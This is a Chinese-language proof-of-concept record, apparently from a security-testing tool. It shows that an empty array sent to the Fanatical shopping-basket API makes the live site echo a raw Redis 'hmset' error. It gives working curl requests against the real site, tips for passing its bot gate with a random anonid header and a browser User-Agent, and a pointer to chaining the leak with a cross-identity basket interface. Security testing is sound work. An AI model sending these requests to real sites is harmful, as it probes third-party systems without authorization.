# Fanatical www /api/basket/setmany 空数组触发未捕获 Redis 错误，原样回显后端数据层与命令（hmset）

- **code**: fanatical-basket-setmany-redis-hmset-error-leak
- **kind**: poc
- **category**: info-leak
- **component**: Fanatical 主站购物车 API（www.fanatical.com/api/basket，Heroku/Express 后端 + Cloudflare Worker 前端）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Linux，curl（UA=$ARTEX_UA，经平台记录代理直发 www.fanatical.com，经 CF Worker，带任意 UUIDv4 的 anonid 头）：POST /api/basket/setmany，body {"products":[]} → HTTP 400，body {"type":"cart","status":"E0","message":"ERR wrong number of arguments for 'hmset' command"}，稳定复现 2 次。对照：同端点 body {"products":["663cd0b11c0036e84f48b26d"]} → HTTP 200 返回购物车 JSON，证明接口本身可达、错误确由空数组触发。另 /api/basket/removemany {"products":[]} → HTTP 500 {"type":"cart","status":"E0","message":"Unexpected Error"}（同类底层异常未处理）。返回的 "ERR ... 'hmset' command" 为 Redis 服务端错误原文，非应用自定义文案 ⇒ 确证后端数据层为 Redis 且异常未捕获，finding_checks.verdict=verified。
- **path**: pocs/fanatical-basket-setmany-redis-hmset-error-leak/poc.md
- **tags**: info-expose, redis, error-leak, hmset, unhandled-exception, basket-api, anonid, fanatical, stack-fingerprint
- **created_at**: 2026-11-11T16:15:33.069Z
- **engine**: https://www.fanatical.com/api/basket/setmany

## 描述

原理：未鉴权购物车批量接口 POST /api/basket/setmany 在 products 为空数组时未捕获底层异常，把 Redis 原始命令错误直接回显给客户端。价值：泄露后端数据层为 Redis、购物车以 anonid 为键的哈希实现（hmset），并为键/序列化层探测提供反馈。适用面：任何把底层驱动报错直接透传给客户端的购物车/会话接口，用于确认后端存储技术栈并辅助后续键探测。

## 用法

```
前置条件：
- 无需登录态；
- 需带任意合法 UUIDv4 的 `anonid` 请求头（否则被 CF Worker bot 门禁拦成 400 "Request blocked"）；
- 使用浏览器类 User-Agent（裸 curl UA 会被边缘 403）。

【命中】
curl -s -X POST https://www.fanatical.com/api/basket/setmany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":[]}'
# → HTTP 400 {"type":"cart","status":"E0","message":"ERR wrong number of arguments for 'hmset' command"}

【对照（证明接口可达、错误由空数组触发，排除整站拦截）】
curl -s -X POST https://www.fanatical.com/api/basket/setmany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":["663cd0b11c0036e84f48b26d"]}'
# → HTTP 200（返回购物车 JSON）

【同类未处理异常旁证】
POST /api/basket/removemany {"products":[]} → HTTP 500 {"type":"cart","status":"E0","message":"Unexpected Error"}

判据：
- 返回体含 "ERR wrong number of arguments for 'hmset' command" —— 这是 Redis 服务端错误原文（非应用自定义文案），故可确证后端为 Redis 且异常未捕获；
- 必须配上"正常路径 200"对照，否则无法区分"接口挂了"与"空数组触发底层异常"。

常见失败原因：
- 缺 anonid 头 ⇒ 400 text/html "Request blocked"（是门禁不是接口行为）；
- 用裸 curl UA ⇒ 403 被爬虫拦截；
- 目标已补异常处理器 ⇒ 回显变为通用错误文案（此时仅剩技术栈泄露价值，甚至无回显）。

关联：配合"以 anonid 为唯一身份、可跨身份读写游客购物车"的接口（同站 /api/basket），可进一步验证键可控性。
```

## 正文

```
# Fanatical /api/basket/setmany 未捕获 Redis 错误回显

## 前置
- 无需登录态
- 必须带任意 UUIDv4 的 `anonid` 请求头（否则 CF Worker bot 门禁 → 400 "Request blocked"）
- 使用浏览器类 User-Agent（裸 curl UA 被边缘 403）

## 命中
```bash
curl -s -X POST https://www.fanatical.com/api/basket/setmany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":[]}'
```
回显：
```
HTTP 400
{"type":"cart","status":"E0","message":"ERR wrong number of arguments for 'hmset' command"}
```

## 对照（缺一不可）
```bash
# 正常路径：证明接口可达、错误确由空数组触发
curl -s -X POST https://www.fanatical.com/api/basket/setmany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":["663cd0b11c0036e84f48b26d"]}'
# → HTTP 200（返回购物车 JSON）

# 同类未处理异常旁证
curl -s -X POST https://www.fanatical.com/api/basket/removemany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":[]}'
# → HTTP 500 {"type":"cart","status":"E0","message":"Unexpected Error"}
```

## 判据
- `ERR wrong number of arguments for 'hmset' command` 是 Redis 服务端错误原文（非应用自定义文案）⇒ 后端数据层为 Redis 且异常未捕获；
- 必须有"正常路径 200"对照，否则无法区分"接口挂了"与"空数组触发底层异常"。

## 泄露点
- 后端数据层 = Redis；
- 购物车以 `anonid` 为键、用 `hmset` 哈希实现；
- 为键/序列化层探测提供反馈（配合已知的 anonid 跨身份读写接口）。

## 失败常见原因
- 缺 anonid 头 → 400 text/html "Request blocked"（门禁行为，非接口）；
- 裸 curl UA → 403 爬虫拦截；
- 目标已补异常处理 → 回显变为通用文案，或无回显。

```
